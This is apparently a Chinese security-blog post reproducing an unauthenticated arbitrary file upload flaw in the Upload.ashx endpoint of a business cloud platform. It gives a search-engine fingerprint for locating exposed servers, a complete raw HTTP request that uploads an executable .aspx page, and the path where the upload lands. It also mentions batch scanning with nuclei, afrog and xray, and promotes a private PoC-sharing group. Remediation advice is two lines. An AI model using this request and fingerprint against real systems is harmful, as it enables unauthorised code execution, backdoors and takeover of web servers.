#  【漏洞复现】某天云智慧平台系统 Upload.ashx 任意文件上传漏洞   
原创 Superhero  Nday Poc   2024-08-05 09:48  
  
**0x01 产品简介**  
  
某天云智慧平台系统，作为方天科技公司的重要产品，是一款面向企业全流程的业务管理功能平台，集成了ERP（企业资源规划）、MES（车间执行系统）、APS（先进规划与排程）、PLM（产品生命周期）、CRM（客户关系管理）等多种功能模块，旨在通过云端服务为企业提供数字化、智能化的管理解决方案。  
  
  
**0x02 漏洞概述**  
  
某天云智慧平台系统 Upload.ashx 接口处存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。  
  
  
**0x03 搜索引擎**  
```
body="AjaxMethods.asmx/GetCompanyItem"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKl0icMBqaW29lTYxhX6jzV2eSfKc3AJ6TGApTRWiaMic2o1IM453oic1YpQYdbdV49WIwL1vUA54OSGg/640?wx_fmt=png&from=appmsg "")  
  
  
**0x04 漏洞复现**  
```
POST /Upload.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX
Connection: close
 
------WebKitFormBoundarySl8siBbmVicABvTX
Content-Disposition: form-data; name="file"; filename="qwe.aspx"
Content-Type: image/jpeg
 
<%@Page Language="C#"%><%Response.Write("hello");System.IO.File.Delete(Request.PhysicalPath);%>
------WebKitFormBoundarySl8siBbmVicABvTX--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKl0icMBqaW29lTYxhX6jzV29AicjjiaSvSWicEJpaOvsASuYibjqAcgwsQkqxNh2RZ5OTrVXoTo0JI5eA/640?wx_fmt=png&from=appmsg "")  
```
UploadFile/CustomerFile/返回的路径名
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKl0icMBqaW29lTYxhX6jzV2u2BtWXM9eiaH0YgR6OdorhEFrSoyPRG67BylvCo6t4KeMQ0pNZgIwBA/640?wx_fmt=png&from=appmsg "")  
  
****  
**0x05 工具批量**  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKl0icMBqaW29lTYxhX6jzV2p39Aamk6sl5ppiaFNgYLupbIdibZia6jxfFFQJgTn5zqp8LN4MNNPcR0w/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKl0icMBqaW29lTYxhX6jzV2FItEzlZoJg3r1S3YHqNHXiaKCQ1NupHC8kH3RLuud1OiaLo0hHj2ib0cw/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKl0icMBqaW29lTYxhX6jzV2YaY0Df1PjKRrUFuE7RV49mjJcicxibMWqcLaVrg1GJTRPtUvE0aY6qCA/640?wx_fmt=png&from=appmsg "")  
  
POC  
脚本获取  
  
请使用VX扫一扫加入内部  
POC脚本分享圈子  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKl0icMBqaW29lTYxhX6jzV2MMeRN5HA6TvyZPThhIBB0G6Rl0vWxScsy5BicmM9FG6GP3W3LSSA0gg/640?wx_fmt=png&from=appmsg "")  
  
  
**0x06 修复建议**  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、及时升级到安全版本  
  
  
  
